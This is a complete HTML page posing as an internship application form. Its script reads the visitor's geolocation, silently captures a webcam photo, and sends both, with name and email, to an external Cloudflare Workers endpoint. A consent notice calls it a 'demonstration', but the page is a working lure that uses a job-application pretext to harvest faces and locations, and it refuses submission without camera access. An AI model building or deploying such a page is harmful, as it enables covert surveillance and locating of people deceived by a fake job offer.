<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Internship Application</title><style>body{font-family:system-ui,sans-serif;background:#f4f7fb;margin:0;color:#172033}.wrap{max-width:760px;margin:40px auto;padding:20px}.card{background:#fff;padding:28px;border-radius:16px;box-shadow:0 8px 30px #0001}label{display:block;margin-top:14px;font-weight:600}input,button{width:100%;box-sizing:border-box;padding:12px;margin-top:7px;border:1px solid #ccd3df;border-radius:9px;font-size:16px}button{background:#172033;color:#fff;border:0;margin-top:20px;cursor:pointer}.notice{font-size:14px;line-height:1.5;color:#4b5563}.success{background:#e9f8ed;padding:14px;border-radius:10px;color:#166534}.error{background:#fdecec;padding:14px;border-radius:10px;color:#991b1b}#video,#canvas{display:none}</style></head><body><div class="wrap"><div class="card"><h1>Internship Application</h1><p class="notice">Complete the application and provide the requested permissions.<br>With your explicit consent, this demonstration collects your public IP address, approximate browser location, and one camera photo. The information is temporary and automatically expires after 30 minutes.</p><form id="form"><label>Full name<input id="name" required></label><label>Email<input id="email" type="email" required></label><label>Internship<input id="internship" required></label><label style="font-weight:400"><input id="consent" type="checkbox" style="width:auto" required> I consent to the collection described above for this demonstration.</label><video id="video" autoplay playsinline></video><canvas id="canvas"></canvas><button id="submit" type="submit">Submit Application</button></form><div id="message"></div></div></div><script>const API="https://tight-tooth-9b22.venkatmovva2727.workers.dev/api";const $=id=>document.getElementById(id);async function getLocation(){return new Promise(r=>navigator.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude,longitude:p.coords.longitude}),()=>r(null),{enableHighAccuracy:false,timeout:10000}))}async function getPhoto(){let s;try{s=await navigator.mediaDevices.getUserMedia({video:true});const v=$("video");v.srcObject=s;await new Promise(r=>setTimeout(r,700));const c=$("canvas"),x=Math.min(1,640/v.videoWidth);c.width=Math.round(v.videoWidth*x);c.height=Math.round(v.videoHeight*x);c.getContext("2d").drawImage(v,0,0,c.width,c.height);return c.toDataURL("image/jpeg",.72)}catch(e){return null}finally{if(s)s.getTracks().forEach(t=>t.stop())}}$("form").addEventListener("submit",async e=>{e.preventDefault();const b=$("submit");b.disabled=true;$("message").innerHTML='<p class="notice">Requesting the permissions you approved...</p>';try{const location=await getLocation(),photo=await getPhoto();if(!photo)throw Error("Camera permission is required for this demonstration.");const r=await fetch(API+"/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({name:$("name").value.trim(),email:$("email").value.trim(),internship:$("internship").value.trim(),location,photo})});if(!r.ok)throw Error("Submission failed");$("form").style.display="none";$("message").innerHTML='<div class="success">Registration completed successfully. Thank you.</div>'}catch(err){$("message").innerHTML='<div class="error">'+err.message+'</div>';b.disabled=false}});</script></body></html>
